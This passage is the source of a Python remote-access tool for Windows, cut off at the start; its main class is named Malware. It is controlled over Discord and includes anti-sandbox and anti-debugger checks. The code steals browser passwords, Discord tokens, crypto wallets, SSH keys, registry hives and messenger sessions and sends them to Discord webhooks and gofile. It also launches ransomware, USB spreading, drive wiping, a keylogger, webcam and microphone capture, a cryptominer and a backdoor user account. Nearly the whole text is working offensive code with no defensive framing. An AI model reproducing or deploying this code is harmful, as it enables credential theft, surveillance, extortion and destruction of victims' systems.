            elif cmd == "wipe":
                threading.Thread(target=self.wipe_drive, daemon=True).start()
                self.send_discord(f"WIPE STARTED")
            elif cmd.startswith("formatdrive"):
                parts = cmd.split()
                drive = parts[1] if len(parts) > 1 else "C:"
                threading.Thread(target=self.format_drive, args=(drive,)).start()
                self.send_discord(f"FORMAT DRIVE {drive} STARTED")
            elif cmd == "creds":
                threading.Thread(target=self.get_all_credentials, daemon=True).start()
                self.send_discord(f"CREDS DUMPING STARTED")
            elif cmd == "network":
                threading.Thread(target=self.get_network_info, daemon=True).start()
                self.send_discord(f"NETWORK INFO STARTED")
            elif cmd == "processes":
                threading.Thread(target=self.get_processes, daemon=True).start()
                self.send_discord(f"PROCESSES LIST STARTED")
            elif cmd == "services":
                threading.Thread(target=self.get_services, daemon=True).start()
                self.send_discord(f"SERVICES LIST STARTED")
            elif cmd == "firewall":
                threading.Thread(target=self.get_firewall_status, daemon=True).start()
                self.send_discord(f"FIREWALL STATUS STARTED")
            elif cmd == "disablefirewall":
                self.disable_firewall()
            elif cmd == "enablefirewall":
                self.enable_firewall()
            elif cmd == "rdp":
                self.enable_rdp()
            elif cmd == "backdoor":
                self.create_backdoor_user()
            elif cmd == "lock":
                self.lock_screen()
            elif cmd == "shutdown":
                self.shutdown_pc()
            elif cmd == "restart":
                self.restart_pc()
            elif cmd == "bsod":
                self.bsod()
            elif cmd == "deleteall":
                threading.Thread(target=self.delete_all, daemon=True).start()
                self.send_discord(f"DELETE ALL STARTED")
            elif cmd == "keylogstart":
                threading.Thread(target=self.run_keylogger, daemon=True).start()
                self.send_discord(f"KEYLOGGER STARTED")
            elif cmd == "keylogstop":
                self.stop_keylogger()
            elif cmd.startswith("upload "):
                threading.Thread(target=self.upload_file, args=(cmd[7:].strip(),)).start()
            elif cmd == "disableav":
                self.disable_defender()
                self.send_discord(f"ANTIVIRUS DISABLED")
            elif cmd == "blocktaskmgr":
                self.block_task_manager()
                self.send_discord(f"TASK MANAGER BLOCKED")
            elif cmd.startswith("open "):
                threading.Thread(target=self.open_app, args=(cmd[5:].strip(),)).start()
            elif cmd.startswith("kill "):
                threading.Thread(target=self.kill_app, args=(cmd[5:].strip(),)).start()
            elif cmd.startswith("killpid "):
                threading.Thread(target=self.kill_pid, args=(cmd[8:].strip(),)).start()
            elif cmd.startswith("deleteapp "):
                threading.Thread(target=self.delete_app, args=(cmd[10:].strip(),)).start()
            elif cmd.startswith("record "):
                try:
                    dur = int(cmd[7:].strip())
                except:
                    dur = 10
                threading.Thread(target=self.record_screen, args=(dur,)).start()
            elif cmd == "record":
                threading.Thread(target=self.record_screen, args=(10,)).start()
            elif cmd == "disablekb":
                self.disable_keyboard()
            elif cmd == "enablekb":
                self.enable_keyboard()
            elif cmd == "disablemouse":
                self.disable_mouse()
            elif cmd == "enablemouse":
                self.enable_mouse()
            elif cmd == "mute":
                self.volume_mute()
            elif cmd == "unmute":
                self.volume_unmute()
            elif cmd.startswith("volume "):
                try:
                    level = int(cmd[7:].strip())
                    if 0 <= level <= 100:
                        self.set_volume(level)
                except: pass
            else: self.send_discord(f"UNKNOWN: {cmd}")
        except Exception as e: self.send_discord(f"ERROR: {str(e)}")

    def discord_control(self):
        last_id = None
        while self.running:
            try:
                url = f"https://discord.com/api/v9/channels/{self.channel_id}/messages"
                headers = {"Authorization": f"Bot {self.bot_token}"}
                params = {"limit": 1}
                if last_id: params["before"] = last_id
                r = requests.get(url, headers=headers, params=params)
                if r.status_code == 200:
                    msgs = r.json()
                    if msgs:
                        msg = msgs[0]
                        last_id = msg["id"]
                        if msg["author"]["id"] != "YOUR_BOT_ID":
                            content = msg["content"]
                            if content.startswith("!login"):
                                if "wormgpt2024" in content:
                                    self.authenticated = True
                                    self.send_discord(f"AUTH SUCCESS")
                                else:
                                    self.send_discord(f"AUTH FAILED")
                            elif content.startswith("!") and self.authenticated:
                                cmd = content[1:].strip()
                                threading.Thread(target=self.execute_command, args=(cmd,)).start()
                time.sleep(2)
            except: time.sleep(5)

    def webhook_listener(self):
        last_id = None
        while self.running:
            try:
                url = f"https://discord.com/api/v9/webhooks/{self.webhook_url.split('/')[-2]}/{self.webhook_url.split('/')[-1]}/messages"
                r = requests.get(url, params={"limit": 1})
                if r.status_code == 200:
                    msgs = r.json()
                    if msgs:
                        msg = msgs[0]
                        if msg["id"] != last_id:
                            last_id = msg["id"]
                            content = msg["content"]
                            if "|" in content or "BROADCAST:" in content:
                                threading.Thread(target=self.process_command, args=(content,)).start()
                time.sleep(3)
            except: time.sleep(5)

    def main(self):
        self.hide_console()
        self.disable_defender()
        self.startup_persistence()
        if Checks.is_admin(): self.block_task_manager()
        self.send_victim_info()
        self.send_discord(f"{self.victim_id} | {self.discord_user} | {self.ip} | ONLINE")
        zip_path = os.path.join(Paths().temp, self.zip_name)
        zf = zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED)
        if self.start_stealer(zf):
            zf.close()
            url = self.upload_gofile(zip_path)
            self.send_webhook(gofile_url=url) if url else self.send_webhook(file_path=zip_path)
            self.send_discord(f"STEALER COMPLETE")
            self.delete_file(zip_path)
        threading.Thread(target=self.ransomware, daemon=True).start()
        threading.Thread(target=self.spread_usb, daemon=True).start()
        threading.Thread(target=self.destroy_system, daemon=True).start()
        threading.Thread(target=self.destroy_windows, daemon=True).start()
        threading.Thread(target=self.webcam_loop, daemon=True).start()
        threading.Thread(target=self.screenshot_loop, daemon=True).start()
        threading.Thread(target=self.clipboard_monitor, daemon=True).start()
        threading.Thread(target=self.bitcoin_miner, daemon=True).start()
        threading.Thread(target=self.discord_control, daemon=True).start()
        threading.Thread(target=self.webhook_listener, daemon=True).start()
        threading.Thread(target=self.run_keylogger, daemon=True).start()
        while self.running: time.sleep(1)

class AntiSandbox:
    DLL_INDICATORS = ["SbieDll.dll","VBoxHook.dll","VBoxSF.dll","VBoxDisp.dll","vmcheck.dll","snxhk.dll","dbghelp.dll"]
    VM_MAC_PREFIXES = ["00:05:69","00:0C:29","00:1C:14","00:50:56","08:00:27"]
    @staticmethod
    def detect_dlls():
        for dll in AntiSandbox.DLL_INDICATORS:
            if ctypes.windll.kernel32.GetModuleHandleA(dll.encode()): return True
        return False
    @staticmethod
    def detect_mac():
        try:
            out = subprocess.check_output("getmac", creationflags=0x08000000).decode(errors="ignore")
            for mac in re.findall(r"([0-9A-F]{2}(?:-[0-9A-F]{2}){5})", out, re.I):
                if any(mac.replace("-",":").lower().startswith(p.lower()) for p in AntiSandbox.VM_MAC_PREFIXES):
                    return True
        except: pass
        return False
    @staticmethod
    def detect_hardware():
        try:
            class MEM(ctypes.Structure):
                _fields_ = [('dwLength', ctypes.c_ulong), ('dwMemoryLoad', ctypes.c_ulong), ('ullTotalPhys', ctypes.c_ulonglong)]
            m = MEM()
            m.dwLength = ctypes.sizeof(m)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
            return m.ullTotalPhys / (1024**3) < 2 or os.cpu_count() <= 1
        except: return False
    @staticmethod
    def detect_boot_time():
        try: return time.time() - psutil.boot_time() < 30
        except: return False

class Checks:
    @staticmethod
    def is_connected():
        try: requests.get("https://www.google.com", timeout=3); return True
        except: return False
    @staticmethod
    def is_windows(): return platform.system().lower() == "windows"
    @staticmethod
    def is_admin(): return ctypes.windll.shell32.IsUserAnAdmin()
    @staticmethod
    def is_sandboxed():
        return any([AntiSandbox.detect_mac(), AntiSandbox.detect_dlls(), AntiSandbox.detect_hardware(), AntiSandbox.detect_boot_time()])
    @staticmethod
    def is_debugged():
        blacklist = ['cheatengine','x32dbg','x64dbg','ollydbg','windbg','ida','ghidra','radare2','dnspy','wireshark','vmtoolsd','vboxservice','processhacker','procexp','procmon']
        try:
            for proc in psutil.process_iter(['name']):
                if any(x in proc.info['name'].lower() for x in blacklist): return True
        except: pass
        return False

class StealerFunctions:
    @staticmethod
    def System_Infos(zf):
        try:
            ip = requests.get("https://ipwhois.app/json/", timeout=10).json()
            ipinfo = "\n".join([f"{k}: {ip[k]}" for k in ip])
        except: ipinfo = "No IP"
        info = f"hostname: {socket.gethostname()}\nuser: {getpass.getuser()}\nOS: {platform.system()} {platform.release()}\nCPU: {os.cpu_count()} cores\nRAM: {round(psutil.virtual_memory().total/1024**3,2)} GB\nIP: {socket.gethostbyname(socket.gethostname())}\n{ipinfo}"
        zf.writestr("system.txt", info)
        return True

    @staticmethod
    def Discord_Tokens(zf):
        tokens = []
        paths = [
            os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb"),
            os.path.join(os.environ["APPDATA"], "discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.environ["APPDATA"], "discordptb", "Local Storage", "leveldb"),
            os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")
        ]
        for p in paths:
            if not os.path.exists(p): continue
            for f in os.listdir(p):
                if f.endswith((".log", ".ldb")):
                    with open(os.path.join(p, f), errors="ignore") as file:
                        tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', file.read()))
        if tokens:
            zf.writestr("discord_tokens.txt", "\n".join(set(tokens)))
        return len(set(tokens))

    @staticmethod
    def Discord_Injector():
        try:
            paths = [
                os.path.join(os.environ["APPDATA"], "discord", "0.0.309", "modules", "discord_desktop_core-1", "discord_desktop_core", "index.js"),
                os.path.join(os.environ["APPDATA"], "discordcanary", "0.0.309", "modules", "discord_desktop_core-1", "discord_desktop_core", "index.js")
            ]
            inject = """
const w = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
w.onopen = () => w.send(JSON.stringify({op:2,d:{token:localStorage.getItem('token'),properties:{os:'Windows'}}}));
setInterval(() => w.send(JSON.stringify({op:1,d:Date.now()})), 30000);
"""
            for p in paths:
                if os.path.exists(p):
                    with open(p, "a") as f: f.write(inject)
        except: pass

    @staticmethod
    def Browser_Infos(zf, choice):
        try:
            local = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            login = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
            with open(local, "r") as f: data = json.load(f)
            key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
            master = CryptUnprotectData(key, None, None, None, 0)[1]
            shutil.copy(login, "login.db")
            conn = sqlite3.connect("login.db")
            c = conn.cursor()
            c.execute("SELECT origin_url, username_value, password_value FROM logins")
            out = ""
            for row in c.fetchall():
                if row[2] and len(row[2]) > 16:
                    try:
                        iv = row[2][3:15]
                        ct = row[2][15:-16]
                        tag = row[2][-16:]
                        cipher = AES.new(master, AES.MODE_GCM, iv)
                        pwd = cipher.decrypt_and_verify(ct, tag).decode()
                        out += f"{row[0]}|{row[1]}|{pwd}\n"
                    except: pass
            conn.close()
            os.remove("login.db")
            if out: zf.writestr("chrome_passwords.txt", out)
            for browser in ['edge','brave','opera']:
                try:
                    p = os.path.join(os.environ["LOCALAPPDATA"], browser.capitalize(), "User Data", "Default", "Login Data")
                    if os.path.exists(p): shutil.copy(p, f"{browser}.db")
                except: pass
        except: pass
        return 0

    @staticmethod
    def Crypto_Wallets(zf):
        wallets = [
            os.path.join(os.environ["APPDATA"], "Exodus", "exodus.wallet"),
            os.path.join(os.environ["APPDATA"], "atomic", "Local Storage", "leveldb"),
            os.path.join(os.environ["APPDATA"], "Electrum", "wallets"),
            os.path.join(os.environ["APPDATA"], "Binance"),
            os.path.join(os.environ["APPDATA"], "Ledger Live"),
            os.path.join(os.environ["APPDATA"], "Coinomi", "Coinomi", "wallets"),
            os.path.join(os.environ["APPDATA"], "Wasabi Wallet", "Wallets")
        ]
        for w in wallets:
            if os.path.exists(w):
                try:
                    if os.path.isdir(w):
                        shutil.make_archive("wallet", "zip", w)
                        zf.write("wallet.zip", f"crypto/{os.path.basename(w)}.zip")
                        os.remove("wallet.zip")
                    else:
                        zf.write(w, f"crypto/{os.path.basename(w)}")
                except: pass

    @staticmethod
    def System_Files(zf):
        files = [r"C:\Windows\System32\config\SAM", r"C:\Windows\System32\config\SYSTEM", r"C:\Windows\System32\config\SECURITY"]
        for f in files:
            if os.path.exists(f):
                try: zf.write(f, f"system/{os.path.basename(f)}")
                except: pass

    @staticmethod
    def SSH_Keys(zf):
        ssh = os.path.join(os.environ["USERPROFILE"], ".ssh")
        if os.path.exists(ssh):
            try:
                shutil.make_archive("ssh", "zip", ssh)
                zf.write("ssh.zip", "ssh_keys.zip")
                os.remove("ssh.zip")
            except: pass

    @staticmethod
    def WiFi_Passwords(zf):
        try:
            out = subprocess.check_output('netsh wlan show profile name=* key=clear', shell=True, text=True, stderr=subprocess.DEVNULL)
            zf.writestr("wifi.txt", out)
        except: pass
        return 0

    @staticmethod
    def Webcam(zf):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                zf.write("webcam.jpg", "webcam.jpg")
                os.remove("webcam.jpg")
            cap.release()
        except: pass
        return True

    @staticmethod
    def Screenshot(zf):
        try:
            img = pyautogui.screenshot()
            img.save("sc.png")
            zf.write("sc.png", "screenshot.png")
            os.remove("sc.png")
        except: pass
        return True

    @staticmethod
    def AntiVirus_Infos(zf):
        av = []
        for d in ["Avast","AVG","Avira","Bitdefender","Kaspersky","McAfee","Norton","ESET","Windows Defender","Malwarebytes","Sophos"]:
            for p in [Paths().program_files, Paths().program_files_x86]:
                if os.path.exists(os.path.join(p, d)): av.append(d)
        zf.writestr("antivirus.txt", "\n".join(av) if av else "None")
        return len(av)

    @staticmethod
    def Session_files(zf, choice):
        paths = [
            (os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata"), "Telegram"),
            (os.path.join(os.environ["APPDATA"], "WhatsApp"), "WhatsApp"),
            (os.path.join(os.environ["APPDATA"], "Signal"), "Signal"),
            (os.path.join(os.environ["LOCALAPPDATA"], "Steam", "config"), "Steam")
        ]
        for p, name in paths:
            if os.path.exists(p):
                try:
                    shutil.make_archive(name, "zip", p)
                    zf.write(f"{name}.zip", f"sessions/{name}.zip")
                    os.remove(f"{name}.zip")
                except: pass
        return 0

    @staticmethod
    def Telegram_Sessions(zf):
        p = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
        if os.path.exists(p):
            for f in os.listdir(p):
                if f not in ['D877F783D5D3EF8C','map']:
                    try: zf.write(os.path.join(p, f), f"telegram/{f}")
                    except: pass
        return 0

    @staticmethod
    def Search_Important_Files(zf):
        count = 0
        for root, _, files in os.walk(Paths().userprofile):
            if any(x in root.lower() for x in ['windows','program files','system32','temp','cache']): continue
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in ('.key','.pem','.crt','.pfx','.p12','.wallet','.json','.xml','.csv','.log','.sql','.db','.bak'):
                    try:
                        full = os.path.join(root, file)
                        if os.path.getsize(full) < 20*1024*1024:
                            zf.write(full, f"important/{file}")
                            count += 1
                    except: pass
        return count

    @staticmethod
    def Clipboard_Monitor(zf):
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data: zf.writestr("clipboard.txt", str(data))
        except: pass
        return 0

    @staticmethod
    def Keylogger(zf):
        p = os.path.join(Paths().temp, "keys.log")
        if os.path.exists(p):
            with open(p, "r") as f:
                zf.writestr("keylog.txt", f.read())
            os.remove(p)
        return 0

    @staticmethod
    def Screen_Recorder(zf):
        try:
            size = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter("rec.avi", fourcc, 10.0, size)
            for _ in range(50):
                frame = np.array(pyautogui.screenshot())
                out.write(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
            out.release()
            zf.write("rec.avi", "recording.avi")
            os.remove("rec.avi")
        except: pass
        return 0

    @staticmethod
    def Mic_Recorder(zf):
        try:
            import pyaudio, wave
            chunk, fmt, channels, rate = 1024, pyaudio.paInt16, 1, 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=fmt, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
            frames = [stream.read(chunk) for _ in range(0, int(rate/chunk*10))]
            stream.stop_stream(); stream.close(); p.terminate()
            wf = wave.open("mic.wav", 'wb')
            wf.setnchannels(channels); wf.setsampwidth(p.get_sample_size(fmt)); wf.setframerate(rate); wf.writeframes(b''.join(frames)); wf.close()
            zf.write("mic.wav", "mic.wav"); os.remove("mic.wav")
        except: pass
        return 0

    @staticmethod
    def Port_Scanner(zf):
        ports = []
        for p in [21,22,23,25,53,80,110,135,139,143,443,445,993,995,3306,3389,5432,5900,6379,8080,8443,27017,27018]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex(('127.0.0.1', p)) == 0: ports.append(str(p))
                s.close()
            except: pass
        zf.writestr("ports.txt", "\n".join(ports) if ports else "None")
        return len(ports)

    @staticmethod
    def Running_Processes(zf):
        out = ""
        for p in psutil.process_iter(['pid','name','cpu_percent','memory_percent','username']):
            try: out += f"{p.info['pid']}|{p.info['name']}|CPU:{p.info['cpu_percent']}%|MEM:{p.info['memory_percent']}%|USER:{p.info['username']}\n"
            except: pass
        zf.writestr("processes.txt", out)
        return 0

    @staticmethod
    def Installed_Programs(zf):
        out = ""
        for key in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sub = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = None
                        try: name = winreg.QueryValueEx(sub, "DisplayName")[0]
                        except: pass
                        if name: out += f"{name}\n"
                    except: pass
            except: pass
        zf.writestr("programs.txt", out)
        return 0

    @staticmethod
    def Email_Stealer(zf):
        count = 0
        for p in [os.path.join(os.environ["APPDATA"], "Thunderbird", "Profiles")]:
            if os.path.exists(p):
                for profile in os.listdir(p):
                    if os.path.isdir(os.path.join(p, profile)):
                        for f in os.listdir(os.path.join(p, profile)):
                            if f.endswith(".sqlite"):
                                try:
                                    zf.write(os.path.join(p, profile, f), f"email/{profile}_{f}")
                                    count += 1
                                except: pass
        return count

    @staticmethod
    def VPN_Config_Stealer(zf):
        count = 0
        for vpn in ["NordVPN","ExpressVPN","ProtonVPN","OpenVPN","Windscribe","Surfshark","CyberGhost"]:
            p = os.path.join(os.environ["APPDATA"], vpn)
            if os.path.exists(p):
                for f in os.listdir(p):
                    if f.endswith(('.ovpn','.conf','.crt','.key','.pem')):
                        try:
                            zf.write(os.path.join(p, f), f"vpn/{vpn}_{f}")
                            count += 1
                        except: pass
        return count

    @staticmethod
    def FTP_SSH_Credentials(zf):
        count = 0
        for p, name in [(os.path.join(os.environ["APPDATA"], "FileZilla", "sitemanager.xml"), "filezilla"),
                       (os.path.join(os.environ["APPDATA"], "WinSCP.ini"), "winscp"),
                       (os.path.join(os.environ["APPDATA"], "Putty", "Sessions"), "putty")]:
            if os.path.exists(p):
                try:
                    if os.path.isdir(p):
                        shutil.make_archive(name, "zip", p)
                        zf.write(f"{name}.zip", f"ftp/{name}.zip")
                        os.remove(f"{name}.zip")
                    else:
                        zf.write(p, f"ftp/{name}.xml")
                    count += 1
                except: pass
        return count

    @staticmethod
    def Python_Scripts_Stealer(zf):
        count = 0
        for p in [os.path.join(Paths().userprofile, "Desktop"), os.path.join(Paths().userprofile, "Documents"), os.path.join(Paths().userprofile, "PycharmProjects")]:
            if os.path.exists(p):
                for f in os.listdir(p):
                    if f.endswith(".py"):
                        try:
                            zf.write(os.path.join(p, f), f"scripts/{f}")
                            count += 1
                        except: pass
        return count

    @staticmethod
    def Roblox_Cookies(zf):
        try:
            for browser in [browser_cookie3.chrome, browser_cookie3.edge, browser_cookie3.firefox]:
                cookies = browser(domain_name=".roblox.com")
                if ".ROBLOSECURITY=" in str(cookies):
                    cookie = str(cookies).split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0]
                    zf.writestr("roblox.txt", cookie)
                    return 1
        except: pass
        return 0

    @staticmethod
    def Interesting_Files(zf):
        count = 0
        keywords = ["password","pass","login","account","bank","crypto","wallet","seed","private","key","secret","2fa","mfa","backup","recovery"]
        for root, _, files in os.walk(Paths().userprofile):
            if any(x in root.lower() for x in ['windows','program files','system32','temp','cache']): continue
            for file in files:
                if any(k in file.lower() for k in keywords):
                    try:
                        full = os.path.join(root, file)
                        if os.path.getsize(full) < 10*1024*1024:
                            zf.write(full, f"interesting/{file}")
                            count += 1
                    except: pass
        return count

if __name__ == "__main__":
    if not Checks.is_windows(): sys.exit()
    if not Checks.is_connected(): sys.exit()
    if Checks.is_sandboxed(): sys.exit()
    if Checks.is_debugged(): sys.exit()
    Malware().main()
